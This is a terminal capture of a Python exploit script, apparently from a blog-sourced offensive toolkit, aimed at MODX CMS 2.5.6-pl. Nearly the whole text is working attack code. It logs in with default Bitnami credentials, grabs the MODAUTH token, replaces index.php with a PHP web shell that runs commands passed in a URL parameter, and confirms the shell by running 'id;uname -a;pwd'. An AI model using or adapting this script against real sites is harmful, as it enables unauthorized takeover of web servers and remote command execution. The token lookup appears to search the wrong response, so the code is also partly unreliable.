c@kali:~/src/Napalm2.2/libs$ cat shell-modxcms.py
#!/usr/bin/env python
# shell-modxcms.py - upload shell for modx 2.5.6-pl
#     
# !! we need rwx in modx-webdir to go ;Z
#
# 30.05.217 @ code610 blogspot com
# 

import requests
import re

target=raw_input("Hostname> ")

print '[+] Preparing tests for ' + str(target)

session = requests.session()
sesslink = target + '/manager/'

print '[+] Preparing login request...'

data_login = {
        'login_context':'mgr',
        'modahsh':'',
        'returnUrl':'/manager/',
        'username':'user',
        'password':'bitnami',
        'login':'1'
}
data_link = sesslink
doLogin = session.post(data_link, data=data_login)
loginResp = doLogin.text

if 'Logout' in loginResp:
  print '[+] We are logged in ;]'

  # grab HTTP_MODAUTH to build params for shelluprequest
  modlink = target + '/manager/?a=media/browser'
  getmod = session.get(modlink)
  getmodresp = getmod.text

  modfind = re.compile('auth:"(.*?)"')
  modfound = re.search(modfind, loginResp)

  if modfound:
    token = modfound.group(1)

    print '[+] Found HTTP_MODAUTH token:', token

    # preparing shellup req
    shell_data = {
        'action':'browser/file/update',
        'HTTP_MODAUTH':token,
        'wctx':'',
        'source':'1',
        'file':'index.php',
        'content':'<?php system($_GET["x"]);'
    }
    shheader = {'modAuth':token}
    shellreq = target + '/connectors/index.php'
    shellup = session.post(shellreq, data=shell_data, headers=shheader)
    shresp = shellup.text

    print '[+] Shell should be ready now. Verifying:'
    shellme = target + '/index.php?x=id;uname -a;pwd'
    shverif = requests.get(shellme)
    print shverif.text

    print ''

c@kali:~/src/Napalm2.2/libs$
